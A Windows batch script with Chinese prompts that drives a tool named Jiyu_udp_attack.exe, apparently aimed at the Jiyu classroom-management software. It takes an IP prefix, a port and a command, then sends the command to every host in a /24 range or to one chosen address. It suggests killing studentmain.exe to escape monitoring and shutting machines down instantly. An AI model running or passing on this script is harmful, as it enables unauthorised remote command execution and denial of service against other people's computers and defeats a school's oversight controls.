@echo off

setlocal enabledelayedexpansion

echo 常用命令
echo 脱控 taskkill /f /im studentmain.exe
echo 关机 shutdown /s /t 0
echo 打开计算器 calc.exe


set /p IP=IP:

set /p P=端口:


:loop

set /p H=执行命令(1=全网段,2=单IP):

if "%H%"=="1" goto :c

if "%H%"=="2" goto :b

if "%H%"=="3" goto :d

:c

set /p C=执行命令：

Jiyu_udp_attack.exe -ip %IP%0-255 -p %P% -c "%C%"

goto :loop

:b

set /p D=详细接收者地址：

set /p C=执行命令：

Jiyu_udp_attack.exe -ip %IP%%D% -p %P% -c "%C%"

goto :loop